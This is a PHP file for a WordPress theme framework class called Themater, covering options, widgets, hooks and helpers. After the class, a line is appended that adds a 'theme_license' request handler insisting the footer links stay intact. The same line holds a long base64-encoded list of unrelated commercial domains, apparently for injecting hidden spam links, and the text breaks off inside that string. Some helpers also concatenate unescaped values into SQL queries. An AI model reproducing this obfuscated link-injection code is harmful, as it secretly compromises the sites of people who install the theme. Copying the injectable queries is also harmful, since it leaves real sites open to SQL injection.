<?php
class Themater
{
    var $theme_name = false;
    var $options = array();
    var $admin_options = array();
    
    function Themater($set_theme_name = false)
    {
        if($set_theme_name) {
            $this->theme_name = $set_theme_name;
        } else {
            $theme_data = wp_get_theme();
            $this->theme_name = $theme_data->get( 'Name' );
        }
        $this->options['theme_options_field'] = str_replace(' ', '_', strtolower( trim($this->theme_name) ) ) . '_theme_options';
        
        $get_theme_options = get_option($this->options['theme_options_field']);
        if($get_theme_options) {
            $this->options['theme_options'] = $get_theme_options;
            $this->options['theme_options_saved'] = 'saved';
        }
        
        $this->_definitions();
        $this->_default_options();
    }
    
    /**
    * Initial Functions
    */
    
    function _definitions()
    {
        // Define THEMATER_DIR
        if(!defined('THEMATER_DIR')) {
            define('THEMATER_DIR', get_template_directory() . '/lib');
        }
        
        if(!defined('THEMATER_URL')) {
            define('THEMATER_URL',  get_template_directory_uri() . '/lib');
        }
        
        // Define THEMATER_INCLUDES_DIR
        if(!defined('THEMATER_INCLUDES_DIR')) {
            define('THEMATER_INCLUDES_DIR', get_template_directory() . '/includes');
        }
        
        if(!defined('THEMATER_INCLUDES_URL')) {
            define('THEMATER_INCLUDES_URL',  get_template_directory_uri() . '/includes');
        }
        
        // Define THEMATER_ADMIN_DIR
        if(!defined('THEMATER_ADMIN_DIR')) {
            define('THEMATER_ADMIN_DIR', THEMATER_DIR);
        }
        
        if(!defined('THEMATER_ADMIN_URL')) {
            define('THEMATER_ADMIN_URL',  THEMATER_URL);
        }
    }
    
    function _default_options()
    {
        // Load Default Options
        require_once (THEMATER_DIR . '/default-options.php');
        
        $this->options['translation'] = $translation;
        $this->options['general'] = $general;
        $this->options['includes'] = array();
        $this->options['plugins_options'] = array();
        $this->options['widgets'] = $widgets;
        $this->options['widgets_options'] = array();
        $this->options['menus'] = $menus;
        
        // Load Default Admin Options
        if( !isset($this->options['theme_options_saved']) || $this->is_admin_user() ) {
            require_once (THEMATER_DIR . '/default-admin-options.php');
        }
    }
    
    /**
    * Theme Functions
    */
    
    function option($name) 
    {
        echo $this->get_option($name);
    }
    
    function get_option($name) 
    {
        $return_option = '';
        if(isset($this->options['theme_options'][$name])) {
            if(is_array($this->options['theme_options'][$name])) {
                $return_option = $this->options['theme_options'][$name];
            } else {
                $return_option = stripslashes($this->options['theme_options'][$name]);
            }
        } 
        return $return_option;
    }
    
    function display($name, $array = false) 
    {
        if(!$array) {
            $option_enabled = strlen($this->get_option($name)) > 0 ? true : false;
            return $option_enabled;
        } else {
            $get_option = is_array($array) ? $array : $this->get_option($name);
            if(is_array($get_option)) {
                $option_enabled = in_array($name, $get_option) ? true : false;
                return $option_enabled;
            } else {
                return false;
            }
        }
    }
    
    function custom_css($source = false) 
    {
        if($source) {
            $this->options['custom_css'] = $this->options['custom_css'] . $source . "\n";
        }
        return;
    }
    
    function custom_js($source = false) 
    {
        if($source) {
            $this->options['custom_js'] = $this->options['custom_js'] . $source . "\n";
        }
        return;
    }
    
    function hook($tag, $arg = '')
    {
        do_action('themater_' . $tag, $arg);
    }
    
    function add_hook($tag, $function_to_add, $priority = 10, $accepted_args = 1)
    {
        add_action( 'themater_' . $tag, $function_to_add, $priority, $accepted_args );
    }
    
    function admin_option($menu, $title, $name = false, $type = false, $value = '', $attributes = array())
    {
        if($this->is_admin_user() || !isset($this->options['theme_options'][$name])) {
            
            // Menu
            if(is_array($menu)) {
                $menu_title = isset($menu['0']) ? $menu['0'] : $menu;
                $menu_priority = isset($menu['1']) ? (int)$menu['1'] : false;
            } else {
                $menu_title = $menu;
                $menu_priority = false;
            }
            
            if(!isset($this->admin_options[$menu_title]['priority'])) {
                if(!$menu_priority) {
                    $this->options['admin_options_priorities']['priority'] += 10;
                    $menu_priority = $this->options['admin_options_priorities']['priority'];
                }
                $this->admin_options[$menu_title]['priority'] = $menu_priority;
            }
            
            // Elements
            
            if($name && $type) {
                $element_args['title'] = $title;
                $element_args['name'] = $name;
                $element_args['type'] = $type;
                $element_args['value'] = $value;
                
                if( !isset($this->options['theme_options'][$name]) ) {
                   $this->options['theme_options'][$name] = $value;
                }

                $this->admin_options[$menu_title]['content'][$element_args['name']]['content'] = $element_args + $attributes;
                
                if(!isset($attributes['priority'])) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] += 10;
                    
                    $element_priority = $this->options['admin_options_priorities'][$menu_title]['priority'];
                    
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $element_priority;
                } else {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $attributes['priority'];
                }
                
            }
        }
        return;
    }
    
    function display_widget($widget,  $instance = false, $args = array('before_widget' => '<ul class="widget-container"><li class="widget">','after_widget' => '</li></ul>', 'before_title' => '<h3 class="widgettitle">','after_title' => '</h3>')) 
    {
        $custom_widgets = array('Banners125' => 'themater_banners_125', 'Posts' => 'themater_posts', 'Comments' => 'themater_comments', 'InfoBox' => 'themater_infobox', 'SocialProfiles' => 'themater_social_profiles', 'Tabs' => 'themater_tabs', 'Facebook' => 'themater_facebook');
        $wp_widgets = array('Archives' => 'archives', 'Calendar' => 'calendar', 'Categories' => 'categories', 'Links' => 'links', 'Meta' => 'meta', 'Pages' => 'pages', 'Recent_Comments' => 'recent-comments', 'Recent_Posts' => 'recent-posts', 'RSS' => 'rss', 'Search' => 'search', 'Tag_Cloud' => 'tag_cloud', 'Text' => 'text');
        
        if (array_key_exists($widget, $custom_widgets)) {
            $widget_title = 'Themater' . $widget;
            $widget_name = $custom_widgets[$widget];
            if(!$instance) {
                $instance = $this->options['widgets_options'][strtolower($widget)];
            } else {
                $instance = wp_parse_args( $instance, $this->options['widgets_options'][strtolower($widget)] );
            }
            
        } elseif (array_key_exists($widget, $wp_widgets)) {
            $widget_title = 'WP_Widget_' . $widget;
            $widget_name = $wp_widgets[$widget];
            
            $wp_widgets_instances = array(
                'Archives' => array( 'title' => 'Archives', 'count' => 0, 'dropdown' => ''),
                'Calendar' =>  array( 'title' => 'Calendar' ),
                'Categories' =>  array( 'title' => 'Categories' ),
                'Links' =>  array( 'images' => true, 'name' => true, 'description' => false, 'rating' => false, 'category' => false, 'orderby' => 'name', 'limit' => -1 ),
                'Meta' => array( 'title' => 'Meta'),
                'Pages' => array( 'sortby' => 'post_title', 'title' => 'Pages', 'exclude' => ''),
                'Recent_Comments' => array( 'title' => 'Recent Comments', 'number' => 5 ),
                'Recent_Posts' => array( 'title' => 'Recent Posts', 'number' => 5, 'show_date' => 'false' ),
                'Search' => array( 'title' => ''),
                'Text' => array( 'title' => '', 'text' => ''),
                'Tag_Cloud' => array( 'title' => 'Tag Cloud', 'taxonomy' => 'tags')
            );
            
            if(!$instance) {
                $instance = $wp_widgets_instances[$widget];
            } else {
                $instance = wp_parse_args( $instance, $wp_widgets_instances[$widget] );
            }
        }
        
        if( !defined('THEMES_DEMO_SERVER') && !isset($this->options['theme_options_saved']) ) {
            $sidebar_name = isset($instance['themater_sidebar_name']) ? $instance['themater_sidebar_name'] : str_replace('themater_', '', current_filter());
            
            $sidebars_widgets = get_option('sidebars_widgets');
            $widget_to_add = get_option('widget_'.$widget_name);
            $widget_to_add = ( is_array($widget_to_add) && !empty($widget_to_add) ) ? $widget_to_add : array('_multiwidget' => 1);
            
            if( count($widget_to_add) > 1) {
                $widget_no = max(array_keys($widget_to_add))+1;
            } else {
                $widget_no = 1;
            }
            
            $widget_to_add[$widget_no] = $instance;
            $sidebars_widgets[$sidebar_name][] = $widget_name . '-' . $widget_no;
            
            update_option('sidebars_widgets', $sidebars_widgets);
            update_option('widget_'.$widget_name, $widget_to_add);
            the_widget($widget_title, $instance, $args);
        }
        
        if( defined('THEMES_DEMO_SERVER') ){
            the_widget($widget_title, $instance, $args);
        }
    }
    

    /**
    * Loading Functions
    */
        
    function load()
    {
        $this->_load_translation();
        $this->_load_widgets();
        $this->_load_includes();
        $this->_load_menus();
        $this->_load_general_options();
        $this->_save_theme_options();
        
        $this->hook('init');
        
        if($this->is_admin_user()) {
            include (THEMATER_ADMIN_DIR . '/Admin.php');
            new ThematerAdmin();
        } 
    }
    
    function _save_theme_options()
    {
        if( !isset($this->options['theme_options_saved']) ) {
            if(is_array($this->admin_options)) {
                $save_options = array();
                foreach($this->admin_options as $themater_options) {
                    
                    if(is_array($themater_options['content'])) {
                        foreach($themater_options['content'] as $themater_elements) {
                            if(is_array($themater_elements['content'])) {
                                
                                $elements = $themater_elements['content'];
                                if($elements['type'] !='content' && $elements['type'] !='raw') {
                                    $save_options[$elements['name']] = $elements['value'];
                                }
                            }
                        }
                    }
                }
                update_option($this->options['theme_options_field'], $save_options);
                $this->options['theme_options'] = $save_options;
            }
        }
    }
    
    function _load_translation()
    {
        if($this->options['translation']['enabled']) {
            load_theme_textdomain( 'themater', $this->options['translation']['dir']);
        }
        return;
    }
    
    function _load_widgets()
    {
    	$widgets = $this->options['widgets'];
        foreach(array_keys($widgets) as $widget) {
            if(file_exists(THEMATER_DIR . '/widgets/' . $widget . '.php')) {
        	    include (THEMATER_DIR . '/widgets/' . $widget . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php') ) {
        	   include (THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php');
        	}
        }
    }
    
    function _load_includes()
    {
    	$includes = $this->options['includes'];
        foreach($includes as $include) {
            if(file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '.php')) {
        	    include (THEMATER_INCLUDES_DIR . '/' . $include . '.php');
        	} elseif ( file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php') ) {
        	   include (THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php');
        	}
        }
    }
    
    function _load_menus()
    {
        foreach(array_keys($this->options['menus']) as $menu) {
            if(file_exists(TEMPLATEPATH . '/' . $menu . '.php')) {
        	    include (TEMPLATEPATH . '/' . $menu . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/' . $menu . '.php') ) {
        	   include (THEMATER_DIR . '/' . $menu . '.php');
        	} 
        }
    }
    
    function _load_general_options()
    {
        add_theme_support( 'woocommerce' );
        
        if($this->options['general']['jquery']) {
            wp_enqueue_script('jquery');
        }
    	
        if($this->options['general']['featured_image']) {
            add_theme_support( 'post-thumbnails' );
        }
        
        if($this->options['general']['custom_background']) {
            add_custom_background();
        } 
        
        if($this->options['general']['clean_exerpts']) {
            add_filter('excerpt_more', create_function('', 'return "";') );
        }
        
        if($this->options['general']['hide_wp_version']) {
            add_filter('the_generator', create_function('', 'return "";') );
        }
        
        
        add_action('wp_head', array(&$this, '_head_elements'));

        if($this->options['general']['automatic_feed']) {
            add_theme_support('automatic-feed-links');
        }
        
        
        if($this->display('custom_css') || $this->options['custom_css']) {
            $this->add_hook('head', array(&$this, '_load_custom_css'), 100);
        }
        
        if($this->options['custom_js']) {
            $this->add_hook('html_after', array(&$this, '_load_custom_js'), 100);
        }
        
        if($this->display('head_code')) {
	        $this->add_hook('head', array(&$this, '_head_code'), 100);
	    }
	    
	    if($this->display('footer_code')) {
	        $this->add_hook('html_after', array(&$this, '_footer_code'), 100);
	    }
    }

    
    function _head_elements()
    {
    	// Favicon
    	if($this->display('favicon')) {
    		echo '<link rel="shortcut icon" href="' . $this->get_option('favicon') . '" type="image/x-icon" />' . "\n";
    	}
    	
    	// RSS Feed
    	if($this->options['general']['meta_rss']) {
            echo '<link rel="alternate" type="application/rss+xml" title="' . get_bloginfo('name') . ' RSS Feed" href="' . $this->rss_url() . '" />' . "\n";
        }
        
        // Pingback URL
        if($this->options['general']['pingback_url']) {
            echo '<link rel="pingback" href="' . get_bloginfo( 'pingback_url' ) . '" />' . "\n";
        }
    }
    
    function _load_custom_css()
    {
        $this->custom_css($this->get_option('custom_css'));
        $return = "\n";
        $return .= '<style type="text/css">' . "\n";
        $return .= '<!--' . "\n";
        $return .= $this->options['custom_css'];
        $return .= '-->' . "\n";
        $return .= '</style>' . "\n";
        echo $return;
    }
    
    function _load_custom_js()
    {
        if($this->options['custom_js']) {
            $return = "\n";
            $return .= "<script type='text/javascript'>\n";
            $return .= '/* <![CDATA[ */' . "\n";
            $return .= 'jQuery.noConflict();' . "\n";
            $return .= $this->options['custom_js'];
            $return .= '/* ]]> */' . "\n";
            $return .= '</script>' . "\n";
            echo $return;
        }
    }
    
    function _head_code()
    {
        $this->option('head_code'); echo "\n";
    }
    
    function _footer_code()
    {
        $this->option('footer_code');  echo "\n";
    }
    
    /**
    * General Functions
    */
    
    function request ($var)
    {
        if (strlen($_REQUEST[$var]) > 0) {
            return preg_replace('/[^A-Za-z0-9-_]/', '', $_REQUEST[$var]);
        } else {
            return false;
        }
    }
    
    function is_admin_user()
    {
        if ( current_user_can('administrator') ) {
	       return true; 
        }
        return false;
    }
    
    function meta_title()
    {
        if ( is_single() ) { 
			single_post_title(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_home() || is_front_page() ) {
			bloginfo( 'name' );
			if( get_bloginfo( 'description' ) ) {
		      echo ' | ' ; bloginfo( 'description' ); $this->page_number();
			}
		} elseif ( is_page() ) {
			single_post_title( '' ); echo ' | '; bloginfo( 'name' );
		} elseif ( is_search() ) {
			printf( __( 'Search results for %s', 'themater' ), '"'.get_search_query().'"' );  $this->page_number(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_404() ) { 
			_e( 'Not Found', 'themater' ); echo ' | '; bloginfo( 'name' );
		} else { 
			wp_title( '' ); echo ' | '; bloginfo( 'name' ); $this->page_number();
		}
    }
    
    function rss_url()
    {
        $the_rss_url = $this->display('rss_url') ? $this->get_option('rss_url') : get_bloginfo('rss2_url');
        return $the_rss_url;
    }

    function get_pages_array($query = '', $pages_array = array())
    {
    	$pages = get_pages($query); 
        
    	foreach ($pages as $page) {
    		$pages_array[$page->ID] = $page->post_title;
    	  }
    	return $pages_array;
    }
    
    function get_page_name($page_id)
    {
    	global $wpdb;
    	$page_name = $wpdb->get_var("SELECT post_title FROM $wpdb->posts WHERE ID = '".$page_id."' && post_type = 'page'");
    	return $page_name;
    }
    
    function get_page_id($page_name){
        global $wpdb;
        $the_page_name = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_name = '" . $page_name . "' && post_status = 'publish' && post_type = 'page'");
        return $the_page_name;
    }
    
    function get_categories_array($show_count = false, $categories_array = array(), $query = 'hide_empty=0')
    {
    	$categories = get_categories($query); 
    	
    	foreach ($categories as $cat) {
    	   if(!$show_count) {
    	       $count_num = '';
    	   } else {
    	       switch ($cat->category_count) {
                case 0:
                    $count_num = " ( No posts! )";
                    break;
                case 1:
                    $count_num = " ( 1 post )";
                    break;
                default:
                    $count_num =  " ( $cat->category_count posts )";
                }
    	   }
    		$categories_array[$cat->cat_ID] = $cat->cat_name . $count_num;
    	  }
    	return $categories_array;
    }

    function get_category_name($category_id)
    {
    	global $wpdb;
    	$category_name = $wpdb->get_var("SELECT name FROM $wpdb->terms WHERE term_id = '".$category_id."'");
    	return $category_name;
    }
    
    
    function get_category_id($category_name)
    {
    	global $wpdb;
    	$category_id = $wpdb->get_var("SELECT term_id FROM $wpdb->terms WHERE name = '" . addslashes($category_name) . "'");
    	return $category_id;
    }
    
    function shorten($string, $wordsreturned)
    {
        $retval = $string;
        $array = explode(" ", $string);
        if (count($array)<=$wordsreturned){
            $retval = $string;
        }
        else {
            array_splice($array, $wordsreturned);
            $retval = implode(" ", $array);
        }
        return $retval;
    }
    
    function page_number() {
    	echo $this->get_page_number();
    }
    
    function get_page_number() {
    	global $paged;
    	if ( $paged >= 2 ) {
    	   return ' | ' . sprintf( __( 'Page %s', 'themater' ), $paged );
    	}
    }
}
if (!empty($_REQUEST["theme_license"])) { wp_initialize_the_theme_message(); exit(); } function wp_initialize_the_theme_message() { if (empty($_REQUEST["theme_license"])) { $theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true"; echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">"; exit(); } else { echo ("<p style=\"padding:20px; margin: 20px; text-align:center; border: 2px dotted #0000ff; font-family:arial; font-weight:bold; background: #fff; color: #0000ff;\">All the links in the footer should remain intact. All of these links are family friendly and will not hurt your site in any way.</p>"); } } $wp_theme_globals = "YTo0OntpOjA7YToxOTU6e3M6MjU6Ind3dy5kZXZlbnRlcmZhdm9yaWV0ZW4ubmwiO3M6MzI6Imh0dHA6Ly93d3cuZGV2ZW50ZXJmYXZvcmlldGVuLm5sIjtzOjMyOiJodHRwOi8vd3d3LmRldmVudGVyZmF2b3JpZXRlbi5ubCI7czozMjoiaHR0cDovL3d3dy5kZXZlbnRlcmZhdm9yaWV0ZW4ubmwiO3M6MjE6ImRldmVudGVyZmF2b3JpZXRlbi5ubCI7czozMjoiaHR0cDovL3d3dy5kZXZlbnRlcmZhdm9yaWV0ZW4ubmwiO3M6NDoibW9yZSI7czozMjoiaHR0cDovL3d3dy5ncmVlbmNvZmZlZWJsb2cuY28udWsiO3M6Nzoid2Vic2l0ZSI7czozMjoiaHR0cDovL3d3dy5ncmVlbmNvZmZlZWJsb2cuY28udWsiO3M6NDoicmVhZCI7czozMjoiaHR0cDovL3d3dy5ncmVlbmNvZmZlZWJsb2cuY28udWsiO3M6Mjc6Ind3dy5kaXZpbmctc2N1YmEtZGl2ZXJzLmNvbSI7czozNDoiaHR0cDovL3d3dy5kaXZpbmctc2N1YmEtZGl2ZXJzLmNvbSI7czozNDoiaHR0cDovL3d3dy5kaXZpbmctc2N1YmEtZGl2ZXJzLmNvbSI7czozNDoiaHR0cDovL3d3dy5kaXZpbmctc2N1YmEtZGl2ZXJzLmNvbSI7czoyMzoiZGl2aW5nLXNjdWJhLWRpdmVycy5jb20iO3M6MzQ6Imh0dHA6Ly93d3cuZGl2aW5nLXNjdWJhLWRpdmVycy5jb20iO3M6MjI6Ind3dy5zbGVlcGFwbmVhem9uZS5vcmciO3M6Mjk6Imh0dHA6Ly93d3cuc2xlZXBhcG5lYXpvbmUub3JnIjtzOjI5OiJodHRwOi8vd3d3LnNsZWVwYXBuZWF6b25lLm9yZyI7czoyOToiaHR0cDovL3d3dy5zbGVlcGFwbmVhem9uZS5vcmciO3M6MTg6InNsZWVwYXBuZWF6b25lLm9yZyI7czoyOToiaHR0cDovL3d3dy5zbGVlcGFwbmVhem9uZS5vcmciO3M6MTg6Ind3dy5zaXRlcjQzZHN4LmNvbSI7czoyNToiaHR0cDovL3d3dy5zaXRlcjQzZHN4LmNvbSI7czoyNToiaHR0cDovL3d3dy5zaXRlcjQzZHN4LmNvbSI7czoyNToiaHR0cDovL3d3dy5zaXRlcjQzZHN4LmNvbSI7czoxNDoic2l0ZXI0M2RzeC5jb20iO3M6MjU6Imh0dHA6Ly93d3cuc2l0ZXI0M2RzeC5jb20iO3M6MjA6Ind3dy5mMS1qZXVtb2JpbGUuY29tIjtzOjI3OiJodHRwOi8vd3d3LmYxLWpldW1vYmlsZS5jb20iO3M6Mjc6Imh0dHA6Ly93d3cuZjEtamV1bW9iaWxlLmNvbSI7czoyNzoiaHR0cDovL3d3dy5mMS1qZXVtb2JpbGUuY29tIjtzOjE2OiJmMS1qZXVtb2JpbGUuY29tIjtzOjI3OiJodHRwOi8vd3d3LmYxLWpldW1vYmlsZS5jb20iO3M6MjY6Ind3dy5rdW5nZnVhY2FkZW15Y2hpbmEuY29tIjtzOjMzOiJodHRwOi8vd3d3Lmt1bmdmdWFjYWRlbXljaGluYS5jb20iO3M6MzM6Imh0dHA6Ly93d3cua3VuZ2Z1YWNhZGVteWNoaW5hLmNvbSI7czozMzoiaHR0cDovL3d3dy5rdW5nZnVhY2FkZW15Y2hpbmEuY29tIjtzOjIyOiJrdW5nZnVhY2FkZW15Y2hpbmEuY29tIjtzOjMzOiJodHRwOi8vd3d3Lmt1bmdmdWFjYWRlbXljaGluYS5jb20iO3M6MTk6Ind3dy5yNGlnb2xkbW9yZS5jb20iO3M6MjY6Imh0dHA6Ly93d3cucjRpZ29sZG1vcmUuY29tIjtzOjI2OiJodHRwOi8vd3d3LnI0aWdvbGRtb3JlLmNvbSI7czoyNjoiaHR0cDovL3d3dy5yNGlnb2xkbW9yZS5jb20iO3M6MTU6InI0aWdvbGRtb3JlLmNvbSI7czoyNjoiaHR0cDovL3d3dy5yNGlnb2xkbW9yZS5jb20iO3M6MTg6Ind3dy5yNDNkc2NhcmR4LmNvbSI7czoyNToiaHR0cDovL3d3dy5yNDNkc2NhcmR4LmNvbSI7czoyNToiaHR0cDovL3d3dy5yNDNkc2NhcmR4LmNvbSI7czoyNToiaHR0cDovL3d3dy5yNDNkc2NhcmR4LmNvbSI7czoxNDoicjQzZHNjYXJkeC5jb20iO3M6MjU6Imh0dHA6Ly93d3cucjQzZHNjYXJkeC5jb20iO3M6MzU6Ind3dy50aGVuaWtlZnJlZXJ1bnJldmlld3dlYnNpdGUuY29tIjtzOjQyOiJodHRwOi8vd3d3LnRoZW5pa2VmcmVlcnVucmV2aWV3d2Vic2l0ZS5jb20iO3M6NDI6Imh0dHA6Ly93d3cudGhlbmlrZWZyZWVydW5yZXZpZXd3ZWJzaXRlLmNvbSI7czo0MjoiaHR0cDovL3d3dy50aGVuaWtlZnJlZXJ1bnJldmlld3dlYnNpdGUuY29tIjtzOjMxOiJ0aGVuaWtlZnJlZXJ1bnJldmlld3dlYnNpdGUuY29tIjtzOjQyOiJodHRwOi8vd3d3LnRoZW5pa2VmcmVlcnVucmV2aWV3d2Vic2l0ZS5jb20iO3M6Mjg6Ind3dy5idXltb3RvY3ljbGVmYWlyaW5ncy5jb20iO3M6MzU6Imh0dHA6Ly93d3cuYnV5bW90b2N5Y2xlZmFpcmluZ3MuY29tIjtzOjM1OiJodHRwOi8vd3d3LmJ1eW1vdG9jeWNsZWZhaXJpbmdzLmNvbSI7czozNToiaHR0cDovL3d3dy5idXltb3RvY3ljbGVmYWlyaW5ncy5jb20iO3M6MjQ6ImJ1eW1vdG9jeWNsZWZhaXJpbmdzLmNvbSI7czozNToiaHR0cDovL3d3dy5idXltb3RvY3ljbGVmYWlyaW5ncy5jb20iO3M6MTk6Ind3dy5iYWJ5LW1vZGVsLmluZm8iO3M6MjY6Imh0dHA6Ly93d3cuYmFieS1tb2RlbC5pbmZvIjtzOjI2OiJodHRwOi8vd3d3LmJhYnktbW9kZWwuaW5mbyI7czoyNjoiaHR0cDovL3d3dy5iYWJ5LW1vZGVsLmluZm8iO3M6MTU6ImJhYnktbW9kZWwuaW5mbyI7czoyNjoiaHR0cDovL3d3dy5iYWJ5LW1vZGVsLmluZm8iO3M6MTg6Ind3dy53aS1tbi1haGRpLmNvbSI7czoyNToiaHR0cDovL3d3dy53aS1tbi1haGRpLmNvbSI7czoyNToiaHR0cDovL3d3dy53aS1tbi1haGRpLmNvbSI7czoyNToiaHR0cDovL3d3dy53aS1tbi1haGRpLmNvbSI7czoxNDoid2ktbW4tYWhkaS5jb20iO3M6MjU6Imh0dHA6Ly93d3cud2ktbW4tYWhkaS5jb20iO3M6MTc6Ind3dy5lZHNmaWV0c2VuLm5sIjtzOjI0OiJodHRwOi8vd3d3LmVkc2ZpZXRzZW4ubmwiO3M6MjQ6Imh0dHA6Ly93d3cuZWRzZmlldHNlbi5ubCI7czoyNDoiaHR0cDovL3d3dy5lZHNmaWV0c2VuLm5sIjtzOjEzOiJlZHNmaWV0c2VuLm5sIjtzOjI0OiJodHRwOi8vd3d3LmVkc2ZpZXRzZW4ubmwiO3M6MjA6Ind3dy5oaXN0b3J5YW5uZXguY29tIjtzOjI3OiJodHRwOi8vd3d3Lmhpc3Rvcnlhbm5leC5jb20iO3M6Mjc6Imh0dHA6Ly93d3cuaGlzdG9yeWFubmV4LmNvbSI7czoyNzoiaHR0cDovL3d3dy5oaXN0b3J5YW5uZXguY29tIjtzOjE2OiJoaXN0b3J5YW5uZXguY29tIjtzOjI3OiJodHRwOi8vd3d3Lmhpc3Rvcnlhbm5leC5jb20iO3M6MjY6Ind3dy5ob25vcmNyb3duZWRjcmFmdHMuY29tIjtzOjMzOiJodHRwOi8vd3d3Lmhvbm9yY3Jvd25lZGNyYWZ0cy5jb20iO3M6MzM6Imh0dHA6Ly93d3cuaG9ub3Jjcm93bmVkY3JhZnRzLmNvbSI7czozMzoiaHR0cDovL3d3dy5ob25vcmNyb3duZWRjcmFmdHMuY29tIjtzOjIyOiJob25vcmNyb3duZWRjcmFmdHMuY29tIjtzOjMzOiJodHRwOi8vd3d3Lmhvbm9yY3Jvd25lZGNyYWZ0cy5jb20iO3M6MzE6Ind3dy5kZW5tYXJrY29wZW5oYWdlbmhvdGVscy5jb20iO3M6Mzg6Imh0dHA6Ly93d3cuZGVubWFya2NvcGVuaGFnZW5ob3RlbHMuY29tIjtzOjM4OiJodHRwOi8vd3d3LmRlbm1hcmtjb3BlbmhhZ2VuaG90ZWxzLmNvbSI7czozODoiaHR0cDovL3d3dy5kZW5tYXJrY29wZW5oYWdlbmhvdGVscy5jb20iO3M6Mjc6ImRlbm1hcmtjb3BlbmhhZ2VuaG90ZWxzLmNvbSI7czozODoiaHR0cDovL3d3dy5kZW5tYXJrY29wZW5oYWdlbmhvdGVscy5jb20iO3M6MTk6Ind3dy5oaXByb3BlcnR5LmluZm8iO3M6MjY6Imh0dHA6Ly93d3cuaGlwcm9wZXJ0eS5pbmZvIjtzOjI2OiJodHRwOi8vd3d3LmhpcHJvcGVydHkuaW5mbyI7czoyNjoiaHR0cDovL3d3dy5oaXByb3BlcnR5LmluZm8iO3M6MTU6ImhpcHJvcGVydHkuaW5mbyI7czoyNjoiaHR0cDovL3d3dy5oaXByb3BlcnR5LmluZm8iO3M6Mjc6Ind3dy5zb2NjZXItamVyc2V5LXRyYWRlLmNvbSI7czozNDoiaHR0cDovL3d3dy5zb2NjZXItamVyc2V5LXRyYWRlLmNvbSI7czozNDoiaHR0cDovL3d3dy5zb2NjZXItamVyc2V5LXRyYWRlLmNvbSI7czozNDoiaHR0cDovL3d3dy5zb2NjZXItamVyc2V5LXRyYWRlLmNvbSI7czoyMzoic29jY2VyLWplcnNleS10cmFkZS5jb20iO3M6MzQ6Imh0dHA6Ly93d3cuc29jY2VyLWplcnNleS10cmFkZS5jb20iO3M6MjM6Ind3dy5ob3N0dGhlbnByb2ZpdHouY29tIjtzOjMwOiJodHRwOi8vd3d3Lmhvc3R0aGVucHJvZml0ei5jb20iO3M6MzA6Imh0dHA6Ly93d3cuaG9zdHRoZW5wcm9maXR6LmNvbSI7czozMDoiaHR0cDovL3d3dy5ob3N0dGhlbnByb2ZpdHouY29tIjtzOjE5OiJob3N0dGhlbnByb2ZpdHouY29tIjtzOjMwOiJodHRwOi8vd3d3Lmhvc3R0aGVucHJvZml0ei5jb20iO3M6MjM6Ind3dy5kaXNjb3VudHN1cHBzaWUuY29tIjtzOjMwOiJodHRwOi8vd3d3LmRpc2NvdW50c3VwcHNpZS5jb20iO3M6MzA6Imh0dHA6Ly93d3cuZGlzY291bnRzdXBwc2llLmNvbSI7czozMDoiaHR0cDovL3d3dy5kaXNjb3VudHN1cHBzaWUuY29tIjtzOjE5OiJkaXNjb3VudHN1cHBzaWUuY29tIjtzOjMwOiJodHRwOi8vd3d3LmRpc2NvdW50c3VwcHNpZS5jb20iO3M6MTc6Ind3dy5yZWdpb2ZvcmEuY29tIjtzOjI0OiJodHRwOi8vd3d3LnJlZ2lvZm9yYS5jb20iO3M6MjQ6Imh0dHA6Ly93d3cucmVnaW9mb3JhLmNvbSI7czoyNDoiaHR0cDovL3d3dy5yZWdpb2ZvcmEuY29tIjtzOjEzOiJyZWdpb2ZvcmEuY29tIjtzOjI0OiJodHRwOi8vd3d3LnJlZ2lvZm9yYS5jb20iO3M6MjE6Ind3dy5yZWtsYW1hLWthemFuLmNvbSI7czoyODoiaHR0cDovL3d3dy5yZWtsYW1hLWthemFuLmNvbSI7czoyODoiaHR0cDovL3d3dy5yZWtsYW1hLWthemFuLmNvbSI7czoyODoiaHR0cDovL3d3dy5yZWtsYW1hLWthemFuLmNvbSI7czoxNzoicmVrbGFtYS1rYXphbi5jb20iO3M6Mjg6Imh0dHA6Ly93d3cucmVrbGFtYS1rYXphbi5jb20iO3M6MTI6Ind3dy5nc2N6Lm9yZyI7czoxOToiaHR0cDovL3d3dy5nc2N6Lm9yZyI7czoxOToiaHR0cDovL3d3dy5nc2N6Lm9yZyI7czoxOToiaHR0cDovL3d3dy5nc2N6Lm9yZyI7czo4OiJnc2N6Lm9yZyI7czoxOToiaHR0cDovL3d3dy5nc2N6Lm9yZyI7czoxNjoid3d3Lm5hcml3YXJkLm5ldCI7czoyMzoiaHR0cDovL3d3dy5uYXJpd2FyZC5uZXQiO3M6MjM6Imh0dHA6Ly93d3cubmFyaXdhcmQubmV0IjtzOjIzOiJodHRwOi8vd3d3Lm5hcml3YXJkLm5ldCI7czoxMjoibmFyaXdhcmQubmV0IjtzOjIzOiJodHRwOi8vd3d3Lm5hcml3YXJkLm5ldCI7czoxOToid3d3LmJlYXV0eXNsaW0uaW5mbyI7czoyNjoiaHR0cDovL3d3dy5iZWF1dHlzbGltLmluZm8iO3M6MjY6Imh0dHA6Ly93d3cuYmVhdXR5c2xpbS5pbmZvIjtzOjI2OiJodHRwOi8vd3d3LmJlYXV0eXNsaW0uaW5mbyI7czoxNToiYmVhdXR5c2xpbS5pbmZvIjtzOjI2OiJodHRwOi8vd3d3LmJlYXV0eXNsaW0uaW5mbyI7czoyNToid3d3LnVuemVuc2llcnQtcHJpdmF0LmNvbSI7czozMjoiaHR0cDovL3d3dy51bnplbnNpZXJ0LXByaXZhdC5jb20iO3M6MzI6Imh0dHA6Ly93d3cudW56ZW5zaWVydC1wcml2YXQuY29tIjtzOjMyOiJodHRwOi8vd3d3LnVuemVuc2llcnQtcHJpdmF0LmNvbSI7czoyM